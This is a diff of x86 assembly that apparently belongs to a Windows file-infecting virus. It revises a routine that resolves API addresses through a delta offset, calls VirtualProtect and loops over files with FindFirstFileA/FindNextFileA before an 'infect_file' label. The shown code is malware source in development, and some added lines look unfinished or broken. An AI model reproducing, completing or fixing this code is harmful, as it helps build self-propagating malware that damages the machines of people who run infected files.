@@ -113,7 +113,6 @@ find_API:
 	
 	call find_APIAddress						      ; now get api address 
 	
-	
 	lea eax,offset path_C
 	add eax,ebp
 	push eax
@@ -128,30 +127,32 @@ find_API:
 	call [ebp+VirtualProtectAddress]
 	
 find_first_file:
-	lea eax,offset Win32Data
-	add eax,ebp
+	lea eax,[ebp+ offset Win32Data]
 	push eax
-	;push dword ptr[ebp+Win32Data]
-	lea eax,offset search_mask
-	add eax,ebp
+	lea eax,[ebp+offset search_mask]
 	push eax
-	;push dword ptr[ebp+search_mask]
 	call [ebp+FindFirstFileAAddress]
 find_next_file:
 	cmp eax,0
 	je done_find
 	mov dword ptr[ebp+search_handle],eax
-	lea eax,offset Win32Data
-	add eax,ebp
+	lea eax,[ebp+FileName]
+	xor eax,eax
+	;mov ecx,260H
+	;xor al,al
+	;rep stosb
+	
+	lea eax,[ebp+ offset Win32Data]
 	push eax
 	;lea eax,offset search_handle
 	;add eax,ebp
 	;mov eax,dword ptr[ebp+search_handle]
 	;push eax
-	;push dword ptr[ebp+Win32Data]
 	push dword ptr[ebp+search_handle]
 	call [ebp+FindNextFileAAddress]
 	jmp find_next_file
+close_file_handle:
+	;push dword[ebp+search_handle]
 done_find:
 	ret
 infect_file:
